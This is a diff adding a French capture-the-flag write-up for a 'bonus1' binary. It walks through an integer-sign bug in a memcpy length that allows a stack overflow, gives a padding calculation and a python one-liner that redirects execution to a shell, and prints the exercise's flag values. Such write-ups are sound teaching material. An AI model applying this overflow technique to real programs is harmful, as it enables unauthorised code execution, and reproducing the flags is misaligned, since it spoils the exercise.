@@ -571,3 +571,50 @@ payload arg 2 : B * 10 (padding jusqu'à EIP) + adresse de la var d'environnemen
 ```
 
 # flag cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+# flag bonus 1
+
+```c
+undefined4 main(undefined4 param_1,int param_2)
+
+{
+  undefined4 uVar1;
+  undefined1 local_3c [40];
+  int local_14;
+  
+  local_14 = atoi(*(char **)(param_2 + 4));
+  if (local_14 < 10) {
+    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
+    if (local_14 == 0x574f4c46) {
+      execl("/bin/sh","sh",0);
+    }
+    uVar1 = 0;
+  }
+  else {
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+```
+
+le programme prend 2 arguments : un int < 10 et une string de char
+le programme copie local_14 * 4 bytes de la string dans un buffer de 40 bytes
+
+cependant il n'y a rien qui nous empêche de metrre un int < 0 qui va ensuite être typecast en size_t dans memcpy.
+en testant avec -INT_MAX nous obtenons ce résultat :
+```txt
+-2147483648 : 18446744071562067968 : 0
+(int : typecast en size_t : int * 4 typecast en size_t)
+```
+
+pour écrire sur eip il nous faut donc un padding de :
+40 bytes (taille du buffer) + 4 bytes (retour de atoi) + 8 (gap d'allignement and esp, 0xfffffff0) + 4 bytes (pour l'addresse de ebp) = 56
+
+donc pour trouver le 1er argument il nous suffit juste de faire INT_MAX - (56 + 4(addresse de eip à overwrite) / 4) = -2147483633
+on a plus qu'à faire ./bonus1 -2147483633 "<padding de 56> + <adresse de execl dans le programme>"
+
+./bonus1 -2147483633 $(python -c 'print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x82\x84\x04\x
+08")')
+
+## flag : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
